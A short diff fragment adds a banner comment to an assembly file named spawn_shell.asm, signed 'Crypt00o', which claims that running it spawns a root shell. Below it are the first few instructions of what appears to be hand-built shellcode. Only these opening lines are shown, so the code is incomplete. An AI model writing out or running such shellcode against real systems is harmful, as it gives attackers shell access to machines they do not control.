@@ -1,3 +1,13 @@
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;          spawn_shell.asm                                         ;
+;   [+] Hello Iam Crypt00o #                                       ;
+; if you run this code you will get :                              ;
+;                                                                  ;
+;                                                                  ;
+; [+] 0xCrypt00o Going To Spawn A Root Shell                       ;
+; root@kali:~#                                                     ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
  xor eax,eax
  push eax
  push 0xdb3180cd
